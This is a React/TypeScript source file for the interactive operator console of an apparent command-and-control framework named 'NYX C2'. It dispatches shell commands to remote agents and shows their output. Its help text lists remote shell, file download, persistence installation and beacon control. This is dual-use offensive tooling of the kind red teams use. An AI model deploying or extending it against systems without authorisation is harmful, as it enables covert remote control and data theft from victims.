import { useState, useEffect, useRef } from "react";
import { getAgents, createTask, createAgentWS, type Agent, type Task } from "../api/client";
import { Send, Wifi, WifiOff, ChevronDown, Terminal } from "lucide-react";

interface Line { type: "cmd" | "output" | "error" | "info" | "system"; text: string; time?: string; }

const HELP = `Commands:
  shell <cmd>    run a shell command
  sysinfo        system information
  whoami         current user
  pwd            working directory
  ls [path]      list directory
  ps             running processes
  cat <file>     read file
  download <path> download file from agent
  persist        install persistence
  unpersist      remove persistence
  sleep <sec>    set beacon interval
  kill           terminate agent
  clear          clear console
  help           show this message`.trim();

export default function Console() {
  const [agents, setAgents]         = useState<Agent[]>([]);
  const [selectedAgent, setAgent]   = useState("");
  const [command, setCommand]       = useState("");
  const [lines, setLines]           = useState<Line[]>([
    { type: "system", text: "NYX C2 // INTERACTIVE SHELL v0.2.0" },
    { type: "info",   text: "Select an agent and type a command." },
  ]);
  const [loading, setLoading]       = useState(false);
  const [wsLive, setWsLive]         = useState(false);
  const [history, setHistory]       = useState<string[]>([]);
  const [histIdx, setHistIdx]       = useState(-1);
  const wsRef    = useRef<WebSocket | null>(null);
  const pendingRef = useRef<string | null>(null);
  const bottomRef  = useRef<HTMLDivElement>(null);
  const inputRef   = useRef<HTMLInputElement>(null);

  useEffect(() => {
    getAgents().then(d => { setAgents(d); if (d.length > 0 && !selectedAgent) setAgent(d[0].id); });
  }, []);

  useEffect(() => {
    if (!selectedAgent) return;
    wsRef.current?.close();
    const ws = createAgentWS(selectedAgent);
    wsRef.current = ws;
    ws.onopen  = () => { setWsLive(true); push({ type: "system", text: `WebSocket live → agent ${selectedAgent.slice(0, 8)}` }); };
    ws.onclose = () => setWsLive(false);
    ws.onerror = () => setWsLive(false);
    ws.onmessage = e => {
      const ev = JSON.parse(e.data);
      if (ev.type === "task_update" && ev.task_id === pendingRef.current) {
        push({ type: ev.status === "failed" ? "error" : "output", text: ev.output || "(no output)" });
        setLoading(false);
        pendingRef.current = null;
      }
    };
    return () => ws.close();
  }, [selectedAgent]);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const push = (line: Line) => {
    const t = new Date().toLocaleTimeString("en-US", { hour12: false });
    setLines(p => [...p, { ...line, time: t }]);
  };

  const send = async () => {
    if (!command.trim() || !selectedAgent || loading) return;
    const cmd = command.trim();
    const agent = agents.find(a => a.id === selectedAgent);
    push({ type: "cmd", text: `[${agent?.hostname ?? "agent"}]$ ${cmd}` });
    setHistory(h => [cmd, ...h.slice(0, 49)]);
    setHistIdx(-1);
    setCommand("");

    if (cmd === "help")  { push({ type: "output", text: HELP }); return; }
    if (cmd === "clear") { setLines([{ type: "system", text: "Console cleared." }]); return; }

    setLoading(true);
    try {
      const task = await createTask(selectedAgent, cmd);
      pendingRef.current = task.id;
      push({ type: "info", text: `↑ task ${task.id.slice(0, 8)} dispatched` });
      if (!wsLive) {
        for (let i = 0; i < 30; i++) {
          await new Promise(r => setTimeout(r, 1000));
          const res = await fetch(`http://localhost:8000/api/tasks/${task.id}`, {
            headers: { Authorization: `Bearer ${localStorage.getItem("nyx_token")}` },
          }).then(r => r.json()) as Task;
          if (res.status !== "pending" && res.status !== "running") {
            push({ type: res.status === "failed" ? "error" : "output", text: res.output || "(no output)" });
            setLoading(false); pendingRef.current = null; break;
          }
        }
      }
    } catch { push({ type: "error", text: "Failed to dispatch task" }); setLoading(false); }
  };

  const onKey = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") { send(); return; }
    if (e.key === "ArrowUp")   { const i = Math.min(histIdx + 1, history.length - 1); setHistIdx(i); setCommand(history[i] ?? ""); }
    if (e.key === "ArrowDown") { const i = Math.max(histIdx - 1, -1); setHistIdx(i); setCommand(i === -1 ? "" : history[i]); }
  };

  const lineColor = (type: string) => {
    switch (type) {
      case "cmd":    return "#60A5FA";
      case "output": return "#10B981";
      case "error":  return "#EF4444";
      case "system": return "#F59E0B";
      default:       return "#475569";
    }
  };

  return (
    <div className="flex flex-col h-full p-7 gap-4" style={{ height: "100vh" }}>
      {/* header */}
      <div className="flex items-center justify-between flex-shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: "rgba(37,99,235,0.15)", border: "1px solid rgba(37,99,235,0.25)" }}>
            <Terminal size={15} className="text-nyx-accent-light" />
          </div>
          <div>
            <h1 className="text-nyx-cream text-xl font-bold tracking-tight" style={{ fontFamily: "Syne, sans-serif" }}>Console</h1>
            <p className="text-nyx-muted text-xs mt-0.5">Interactive agent shell</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 px-3 py-1.5 rounded-full text-xs" style={{ background: wsLive ? "rgba(16,185,129,0.08)" : "rgba(71,85,105,0.08)", border: `1px solid ${wsLive ? "rgba(16,185,129,0.25)" : "rgba(71,85,105,0.2)"}`, color: wsLive ? "#10B981" : "#475569" }}>
            {wsLive ? <Wifi size={11} /> : <WifiOff size={11} />}
            {wsLive ? "Live" : "Polling"}
          </div>
          <div className="relative">
            <select
              value={selectedAgent}
              onChange={e => setAgent(e.target.value)}
              className="appearance-none input-base rounded-xl px-4 py-2 pr-8 text-sm mono cursor-pointer"
            >
              {agents.length === 0 && <option value="">No agents</option>}
              {agents.map(a => <option key={a.id} value={a.id}>{a.hostname} ({a.ip})</option>)}
            </select>
            <ChevronDown size={13} className="absolute right-3 top-2.5 text-nyx-muted pointer-events-none" />
          </div>
        </div>
      </div>

      {/* terminal */}
      <div
        className="flex-1 rounded-2xl p-5 overflow-y-auto mono text-sm cursor-text"
        style={{ background: "#060B18", border: "1px solid #1A2E4A", minHeight: 0 }}
        onClick={() => inputRef.current?.focus()}
      >
        {lines.map((l, i) => (
          <div key={i} className="flex gap-3 mb-0.5 leading-6">
            <span className="text-nyx-muted text-xs w-16 flex-shrink-0 pt-0.5 select-none">{l.time}</span>
            <span className="whitespace-pre-wrap break-all" style={{ color: lineColor(l.type) }}>{l.text}</span>
          </div>
        ))}
        {loading && (
          <div className="flex gap-3 leading-6">
            <span className="w-16 flex-shrink-0" />
            <span className="animate-pulse" style={{ color: "#F59E0B" }}>waiting for agent…</span>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* input */}
      <div className="flex gap-3 flex-shrink-0">
        <div
          className="flex-1 flex items-center gap-3 rounded-xl px-4 transition-all duration-150"
          style={{ background: "#0C1525", border: "1px solid #1A2E4A" }}
          onFocus={e => (e.currentTarget as HTMLElement).style.borderColor = "#2563EB"}
          onBlur={e  => (e.currentTarget as HTMLElement).style.borderColor = "#1A2E4A"}
        >
          <span className="text-nyx-accent-light mono text-sm select-none">$</span>
          <input
            ref={inputRef}
            value={command}
            onChange={e => setCommand(e.target.value)}
            onKeyDown={onKey}
            placeholder="sysinfo  ·  shell whoami  ·  ls /tmp  ·  help"
            className="flex-1 bg-transparent mono text-nyx-text text-sm py-3 focus:outline-none placeholder:text-nyx-muted"
            autoFocus
          />
        </div>
        <button
          onClick={send}
          disabled={loading || !selectedAgent}
          className="btn-primary w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 disabled:opacity-40"
        >
          <Send size={15} />
        </button>
      </div>
    </div>
  );
}
